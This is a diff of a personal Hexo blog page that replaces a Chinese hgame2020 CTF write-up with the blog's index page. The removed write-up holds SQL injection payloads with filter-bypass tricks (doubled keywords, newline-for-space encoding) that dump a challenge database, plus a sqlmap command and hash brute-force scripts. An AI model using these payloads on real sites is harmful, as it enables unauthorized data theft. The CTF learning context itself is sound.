@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>hgame2020 杂记录-1 · DGZ&#39;s Blog</title>
+    <title>DGZ&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -77,8 +77,6 @@
 
     <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
     <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
-    
-    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
     
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
@@ -203,23 +201,14 @@
 </head>
 
     
-        <body class="post-body">
+        <body class="home-body">
     
     
-<header class="header">
+<header class="header index-header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
-    
-    <div class="banner">
-            <div class="blog-title">
-                <a href="/" >DGZ&#39;s Blog.</a>
-            </div>
-            <div class="post-title">
-                <a href="#" class="post-name">hgame2020 杂记录-1</a>
-            </div>
-    </div>
     
     <a class="home-link" href=/>DGZ's Blog.</a>
 </header>
@@ -238,17 +227,17 @@ height:50vh;
     <!-- 主页  -->
     
     
-    <!-- 404页  -->
+    <!-- 文章页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/index-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            hgame2020 杂记录-1
-            <!-- 404 -->
+            DGZ's Blog.
+            <!-- 文章页  -->
             
         </h1>
         <!-- 副标题 -->
@@ -256,43 +245,12 @@ height:50vh;
             <!-- 主页副标题  -->
             
             
-            <!-- 404 -->
+                it's better to burn out than to fade away
+            
+            <!-- 文章页  -->
             
         </p>
         <!-- 文章页meta -->
-        
-            <div class="post-intros">
-                <!-- 文章页标签  -->
-                
-                
-                    <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">507</span>Reading time: <span class="post-count reading-time">2 min</span></span>
-                    </div>
-                
-                <div class="post-intro-meta">
-                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2020/02/19</span>
-                    
-                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
-                        <span class="iconfont-archer">&#xe602;</span>
-                        <span id="busuanzi_value_page_pv"></span>
-                    </span>
-                    
-                    <span class="shareWrapper">
-                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
-                        <span class="shareText">Share</span>
-                        <ul class="shareList">
-                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
-                                <div class="share-qrcode"></div>
-                            </li>
-                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
-                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
-                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
-                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
-                        </ul>
-                    </span>
-                </div>
-            </div>
         
     </div>
 </div>
@@ -393,79 +351,146 @@ height:50vh;
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main post-page">
-    <article class="article-entry">
-        <h1 id="hgame2020-杂记录-1"><a href="#hgame2020-杂记录-1" class="headerlink" title="hgame2020 杂记录-1"></a>hgame2020 杂记录-1</h1><p>标签（空格分隔）： 未分类</p>
-<hr>
-<h3 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h3><p>题目url:</p>
-<blockquote>
-<p><a href="http://139.199.182.61/index.php?id=1" target="_blank" rel="noopener">http://139.199.182.61/index.php?id=1</a></p>
-</blockquote>
-<p>简单测试一下</p>
-<blockquote>
-<p>1# 回显：id=1 过滤了# 而1%23 回显1#，用url编码即可绕过<br>-1 OR 1 =1 回显：id:-1OR1=1  过滤了空格<br>1, 回显：id=1, 逗号未被过滤，但是没有用到逗号<br>1+ 回显：id=1 过滤了+， select同理，而1seselectlect回显1select，用双写可以绕过</p>
-</blockquote>
-<p>主要是绕过对空格的过滤,用了$/**/$ ，后面发现直接%0a（换行符）也可以，还更直接…<br>再试了一下%a0 %0b %0c %0d 也可以<br>我不太明白的是为什么要手动转义，输入符号到地址栏里不会自己转成url编码，要自己提前转换；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">记住一个流程，库——表——列——数据</span><br><span class="line">#(1)库</span><br><span class="line">id=-1&apos; union seselectlect database()#</span><br><span class="line">id=-1%27%0aunion+%0aseselectlect+%0adatabase()%23</span><br><span class="line">回显：easysql</span><br><span class="line">#(2)表</span><br><span class="line">id=-1&apos; union seselectlect group_concat(table_name) from information_schema.tables where table_schema=&apos;easysql&apos;#</span><br><span class="line">id=-1%27%0aunion%0aseselectlect%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema%3d%27easysql%27%23</span><br><span class="line">回显：f1aggggggggggggg,messages</span><br><span class="line">#(3)列</span><br><span class="line">id=-1’ union seselectlect group_concat(column_name) from information_schema.columns where table_name=&apos;f1aggggggggggggg&apos; and table_schema=&apos;easysql&apos;#</span><br><span class="line">id=-1%27%0aunion%0aseselectlect%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_name%3d%27f1aggggggggggggg%27%0aand%0atable_schema%3d%27easysql%27%23</span><br><span class="line">回显：fl4444444g</span><br><span class="line">#(4)数据</span><br><span class="line">id=-1&apos; union seselectlect fl4444444g from f1aggggggggggggg#</span><br><span class="line">id=-1%27%0aunion%0aseselectlect+%0afl4444444g%0afrom%0af1aggggggggggggg%23</span><br><span class="line">回显：hgame&#123;w0w_sql_InjeCti0n_Is_S0_IntereSting!!&#125;</span><br></pre></td></tr></table></figure></p>
-<p>当然要试验一下sqlmap能不能跑<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://139.199.182.61/index.php?id=1&quot; -p id --dbs</span><br></pre></td></tr></table></figure><br><img src="https://cdn.jsdelivr.net/gh/DGZ-cyber/PicGo-1/img/20200219001059.png" alt=""></p>
-<h3 id="简单的POW脚本（sha256）"><a href="#简单的POW脚本（sha256）" class="headerlink" title="简单的POW脚本（sha256）"></a>简单的POW脚本（sha256）</h3><blockquote>
-<p>sha256(XXXX+bgiFjnj4kJ2Kmzc3) == 0e9428c95bc1832c1d0365665dbcea4d683a627ed63ed129163abf1684f21e4e<br>要求发送XXXX　<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">cipher=&quot;0e9428c95bc1832c1d0365665dbcea4d683a627ed63ed129163abf1684f21e4e&quot;</span><br><span class="line">wenben=&quot;1234567890zxcvbnmasdfghjklqwertyuiopZXCVBNMASDFGHJKLQWERTYUIOP&quot;</span><br><span class="line"></span><br><span class="line">for a in range(0,62):</span><br><span class="line">	for b in range(0,62):</span><br><span class="line">		for c in range(0,62):</span><br><span class="line">			for d in range(0,62):</span><br><span class="line">				x=wenben[a]+wenben[b]+wenben[c]+wenben[d]</span><br><span class="line">				sha=hashlib.sha256(x.encode(&quot;utf-8&quot;)+b&quot;bgiFjnj4kJ2Kmzc3&quot;).hexdigest()</span><br><span class="line">				if sha == cipher:</span><br><span class="line">					print (x)</span><br></pre></td></tr></table></figure><br>结果:<br>o70Q<br>[Finished in 41.1s]</p>
-</blockquote>
-<p>看wp好像可以省略这一步的</p>
-<h3 id="简单的验证码（md5）"><a href="#简单的验证码（md5）" class="headerlink" title="简单的验证码（md5）"></a>简单的验证码（md5）</h3><blockquote>
-<p>md5(code)[0:6]==f71f55<br>要求发送code</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">for i in range(1, 100000001):</span><br><span class="line">    s = hashlib.md5(str(i).encode(&apos;utf-8&apos;)).hexdigest()[0:6]</span><br><span class="line">    if s == &quot;f71f55&quot;:</span><br><span class="line">        print(i)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
-<p>结果：</p>
-<blockquote>
-<p>14050069<br>[Finished in 39.3s]</p>
-</blockquote>
-
-    </article>
-    <!-- license  -->
+            <main class="main index-page">
     
-        <div class="license-wrapper">
-            <p>Author：<a href="https://dgz-cyber.github.io">DGZ</a>
-            <p>原文链接：<a href="https://dgz-cyber.github.io/2020/02/19/hgame2020%20%E6%9D%82%E8%AE%B0%E5%BD%95-1/">https://dgz-cyber.github.io/2020/02/19/hgame2020%20%E6%9D%82%E8%AE%B0%E5%BD%95-1/</a>
-            <p>发表日期：<a href="https://dgz-cyber.github.io/2020/02/19/hgame2020%20%E6%9D%82%E8%AE%B0%E5%BD%95-1/">February 19th 2020, 12:11:42 am</a>
-            <p>更新日期：<a href="https://dgz-cyber.github.io/2020/02/19/hgame2020%20%E6%9D%82%E8%AE%B0%E5%BD%95-1/">February 19th 2020, 12:11:46 am</a>
-            <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/11/24/hello-world/" >
+            
+                <span>Hello World</span>
+        </a>
+        <div class="abstract-content">
+            Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
+Quick StartCreate a new post1$ hexo new "My New Post"
+More info: Writing
+Run server1$ hexo server
+More...
         </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/11/24</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" target="_blank" rel="noopener" data-tags = "None">None</a>
+    
+</div>
+            
+        </div>
+    </article>
     
     <!-- paginator  -->
-    <ul class="post-paginator">
-        <li class="next">
-            
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2020/02/21/HGAME-MISC(WEEK%20ONE)%20Writes%20up/" title= "HGAME-MISC(WEEK ONE) Writes up">
-                    <div class="nextTitle">HGAME-MISC(WEEK ONE) Writes up</div>
-                </a>
-            
-        </li>
-        <li class="previous">
-            
-                <div class="prevSlogan">Previous Post</div>
-                <a href= "/2020/02/16/HGAME-WEB%20Writes%20up/" title= "HGAME-WEB Writes up">
-                    <div class="prevTitle">HGAME-WEB Writes up</div>
-                </a>
-            
-        </li>
-    </ul>
-    <!-- 评论插件 -->
-    <!-- 来必力City版安装代码 -->
-
-<!-- City版安装代码已完成 -->
     
+    <nav class="page-nav">
+        <a class="extend prev" rel="prev" href="/page/2/">&amp;#60; PREV</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
+    </nav>
     
-    <!-- partial('_partial/comment/changyan') -->
-    <!--PC版-->
-
-
-    
-    
-
-    <!-- 评论 -->
 </main>
             <!-- profile -->
+            
+            <div class="profile">
+    <img class="profile-avatar" alt="avatar" src= /avatar/doge.jpg >
+    <div class="profile-name">大狗子</div>
+    
+    <div class="profile-signature">
+        咕咕咕
+    </div>
+    
+    
+    <div class="profile-social">
+        
+    
+        
+            
+                <a href="mailto:congjian_lin@163.com" target="_blank" rel="noopener" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/DGZ-cyber" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/wechat.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    
+        <div class="friends">
+            <div>FRIENDS</div>
+            
+                
+                    <span>
+                        <a href= //https://chikorita.fun/ target="_black">domain</a>
+                    </span>
+                
+            
+                
+                    <span>
+                        <a href= //https://apeng.fun/ target="_black">Apeng</a>
+                    </span>
+                
+            
+                
+                    <span>
+                        <a href= //https://wulidecade.cn/ target="_black">Decade</a>
+                    </span>
+                
+            
+        </div>
+    
+    
+</div>
             
         </div>
         <footer class="footer footer-unloaded">
@@ -548,24 +573,6 @@ height:50vh;
 </footer>
     </div>
     <!-- toc -->
-    
-    <div class="toc-wrapper" style=
-    
-
-
-
-
-
-
-
-top:50vh;
-
-    >
-        <div class="toc-catalog">
-            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
-        </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#hgame2020-杂记录-1"><span class="toc-number">1.</span> <span class="toc-text">hgame2020 杂记录-1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Cosmos的留言板-1"><span class="toc-number">1.0.1.</span> <span class="toc-text">Cosmos的留言板-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#简单的POW脚本（sha256）"><span class="toc-number">1.0.2.</span> <span class="toc-text">简单的POW脚本（sha256）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#简单的验证码（md5）"><span class="toc-number">1.0.3.</span> <span class="toc-text">简单的验证码（md5）</span></a></li></ol></li></ol></li></ol>
-    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1093,8 +1100,6 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
-    
-        <script src="/scripts/share.js" async></script>    
      
     <script type="text/x-mathjax-config">
     MathJax.Hub.Config({
